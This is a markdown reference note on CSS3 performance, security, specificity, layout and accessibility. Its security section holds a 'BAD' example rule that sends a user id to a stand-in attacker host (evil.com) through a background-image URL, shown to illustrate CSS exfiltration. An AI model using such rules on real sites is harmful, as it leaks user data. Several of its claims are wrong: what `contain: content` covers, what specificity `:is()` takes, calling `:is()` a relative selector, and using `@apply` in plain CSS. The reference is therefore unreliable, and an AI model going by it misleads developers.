---
slug: css3-performance-security
sources:
  - https://developer.mozilla.org/en-US/docs/Web/CSS
  - https://developer.mozilla.org/en-US/docs/Web/CSS/Reference
  - https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Properties/animation
  - https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Properties/transition
  - https://developer.mozilla.org/en-US/docs/Web/CSS/Guides
date: 2025-01-15
tags:
  - priority/high
  - maturity/experimental
  - domain/backend
  - domain/frontend
  - type/guide
  - domain/architecture
  - type/concept
  - domain/optimization
  - domain/accessibility
  - status/complete
  - type/reference
  - domain/security
  - css3
  - performance
  - security
  - animations
  - modern-css
  - best-practices
---

# CSS3: Performance, Security & Best Practices

## Overview

CSS3 (Cascading Style Sheets Level 3) is the current standard for web styling, introducing **400+ properties**, modern selectors, at-rules, and powerful layout systems. This note covers performance optimization, security considerations, and best practices.

## Modern CSS Features

### CSS Custom Properties (Variables)

```css
:root {
  --color-primary: #3b82f6;
  --spacing-md: 1rem;
  --radius-lg: 0.5rem;
  --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.05);
}

.card {
  background-color: var(--color-primary);
  padding: var(--spacing-md);
  border-radius: var(--radius-lg);
  box-shadow: var(--shadow-sm);
}
```

**Performance benefit:** Variables are computed once and reused, reducing browser work.

### CSS Functions

```css
/* Dynamic calculations */
.element {
  width: calc(100% - 2rem);
  font-size: clamp(1rem, 2.5vw, 2rem); /* Min, preferred, max */
  color: color-mix(in srgb, var(--color-primary) 70%, white);
  background: var(--bg-color, #fff); /* Fallback value */
}
```

### Modern Selectors

```css
/* Relative selector (CSS 2023) */
.card :is(h2, h3) {
  color: blue;
}

/* Negation selector */
input:not(:disabled):focus {
  outline: 2px solid blue;
}

/* Has selector (CSS 2023) */
tr:has(td.highlight) {
  background-color: yellow;
}

/* Subject selector (via :where() and :is()) */
:where(article, aside) h2 {
  font-size: 1.5rem;
}
```

## Performance Optimization

### GPU-Accelerated Animations

**Always animate transform and opacity** for GPU acceleration:

```css
/* GOOD: GPU-accelerated */
.animated {
  transform: translateX(100px);
  opacity: 0.5;
}

/* BAD: Triggers layout/repaint */
.animated-bad {
  left: 100px; /* Triggers layout */
  width: 200px; /* Triggers layout */
  background-color: red; /* Triggers repaint */
}
```

### will-change Property

Hint to the browser about upcoming animations:

```css
.dropdown {
  will-change: transform, opacity;
}

/* Remove will-change after animation completes */
.dropdown.open {
  will-change: auto;
}
```

**Caution:** Don't overuse `will-change` — it consumes memory.

### CSS Containment

Isolate elements for better rendering performance:

```css
.card {
  contain: layout style paint;
}

/* Size containment: element doesn't affect document flow */
.widget {
  contain: strict;
}
```

### Contain Property Values

| Value | Effect |
|-------|--------|
| `size` | Element size is independent |
| `layout` | Internal layout is independent |
| `paint` | Painting is independent |
| `style` | CSS counters/quotes are independent |
| `content` | `size + layout` combined |
| `strict` | `size + layout + paint + style` |
| `none` | No containment |

### Avoid Expensive Properties

| Property | Cost | Alternative |
|----------|------|-------------|
| `width`, `height` | High | `transform: scale()` |
| `top`, `left` | High | `transform: translate()` |
| `margin` | High | `transform: translate()` |
| `border` | Medium | `outline` (no layout) |
| `background-color` | Medium | `opacity` on overlay |
| `box-shadow` | High | `outline` or pseudo-element |

### Animation Performance

```css
/* GOOD: Use transform and opacity */
@keyframes slideIn {
  from {
    transform: translateX(-100%);
    opacity: 0;
  }
  to {
    transform: translateX(0);
    opacity: 1;
  }
}

.animated {
  animation: slideIn 0.3s ease-out;
  backface-visibility: hidden; /* Prevents flicker */
}

/* BAD: Animate layout properties */
@keyframes badAnimation {
  from {
    margin-left: -100%;
    width: 0;
  }
  to {
    margin-left: 0;
    width: 100%;
  }
}
```

### Transition Best Practices

```css
/* Smooth transitions on GPU properties */
.button {
  transition: transform 0.2s ease, opacity 0.2s ease;
}

.button:hover {
  transform: scale(1.05);
  opacity: 0.9;
}

/* Avoid transitioning 'all' for performance */
.button-bad {
  transition: all 0.3s; /* Expensive: tracks all property changes */
}
```

### CSS Scroll-Driven Animations (Modern)

```css
/* Animate based on scroll position */
.progress-bar {
  animation: fill linear;
  animation-timeline: scroll(root);
}

@keyframes fill {
  from { width: 0%; }
  to { width: 100%; }
}
```

## Security Best Practices

### Content Security Policy (CSP)

CSP prevents XSS by controlling which resources load:

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self';
               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
               script-src 'self';
               img-src 'self' data: https:;">
```

### CSS Exfiltration Prevention

Avoid using CSS to load external resources with user data:

```css
/* BAD: Potential CSS injection for data exfiltration */
[data-user-id="123"] {
  background-image: url('https://evil.com/track?uid=123');
}
```

### Avoid !important Abuse

```css
/* BAD: Makes security styles hard to override */
.modal {
  display: none !important;
}

/* GOOD: Use proper specificity */
.modal.hidden {
  display: none;
}
```

### CSS Houdini (Advanced Security)

CSS Houdini allows custom CSS extensions with security sandboxing:

```js
// Worklet API (experimental)
CSS.registerProperty({
  name: '--custom-prop',
  syntax: '<color>',
  initialValue: 'transparent',
  inherits: true,
});
```

## Cascade & Specificity Best Practices

### Specificity Order (Low to High)

| Specificity | Example | Weight |
|-------------|---------|--------|
| Element | `div` | 0,0,0,1 |
| Class | `.card` | 0,0,1,0 |
| ID | `#header` | 0,1,0,0 |
| Inline | `style=""` | 1,0,0,0 |
| `!important` | `color: red !important` | Override |

### Using :where() and :is() for Manageable Specificity

```css
/* Zero specificity */
:where(.card h2, .card h3) {
  color: blue;
}

/* Lowest specificity from list */
:is(.card h2, .card h3) {
  color: blue;
}
```

### CSS Layers (Cascade Layers)

Control override order explicitly:

```css
@layer base, components, utilities;

@layer base {
  h1 { font-size: 2rem; }
}

@layer components {
  .btn { padding: 0.5rem 1rem; }
}

@layer utilities {
  .text-center { text-align: center; }
}

/* Override layers */
@layer components {
  .btn-primary {
    @apply bg-blue-500 text-white;
  }
}
```

## Modern Layout Systems

### Flexbox

```css
.container {
  display: flex;
  justify-content: center; /* Horizontal */
  align-items: center; /* Vertical */
  gap: 1rem;
  flex-wrap: wrap;
}
```

### CSS Grid

```css
.grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 1.5rem;
}
```

### Container Queries

```css
.card-container {
  container-type: inline-size;
  container-name: card;
}

@container card (min-width: 400px) {
  .card {
    display: grid;
    grid-template-columns: 200px 1fr;
  }
}
```

## Naming Conventions

### BEM (Block Element Modifier)

```css
/* Block */
.card { }

/* Element */
.card__header { }
.card__title { }

/* Modifier */
.card--featured { }
.card__button--primary { }
```

### CSS Modules / Scoped Naming

```css
/* component.module.css */
.container { }
.container__header { }
.container--active { }
```

## Accessibility in CSS

### Reduced Motion

```css
@media (prefers-reduced-motion: reduce) {
  *,
  *::before,
  *::after {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
  }
}
```

### Focus Styles

```css
/* Visible focus indicators */
*:focus-visible {
  outline: 2px solid var(--color-primary);
  outline-offset: 2px;
}

/* Don't remove focus without replacement */
button:focus {
  outline: none; /* BAD */
}
button:focus-visible {
  outline: 2px solid blue; /* GOOD */
}
```

### Screen Reader Only

```css
.sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border: 0;
}
```

## CSS Performance Checklist

- [ ] Animate only `transform` and `opacity`
- [ ] Use `will-change` sparingly
- [ ] Use `contain` for isolated components
- [ ] Avoid `transition: all`
- [ ] Use CSS layers for cascade management
- [ ] Minimize use of `!important`
- [ ] Use `clamp()` for fluid typography
- [ ] Enable CSS minification in production
- [ ] Use `prefers-reduced-motion` for accessibility
- [ ] Avoid expensive properties (`width`, `height`, `top`, `left`)
- [ ] Use CSS custom properties for theming
- [ ] Leverage `@layer` for maintainable specificity

## Cross-References

- See [tw-optimization-performance](D/tw-optimization-performance.md) for Tailwind CSS performance patterns
- See [shadcn-best-practices](D/shadcn-best-practices.md) for component-level CSS practices
- See [html5-best-practices](D/html5-best-practices.md) for HTML5 integration with CSS


## See Also
- [[CS02-css-fundamentals]]
- [[CS03-css-media-queries]]


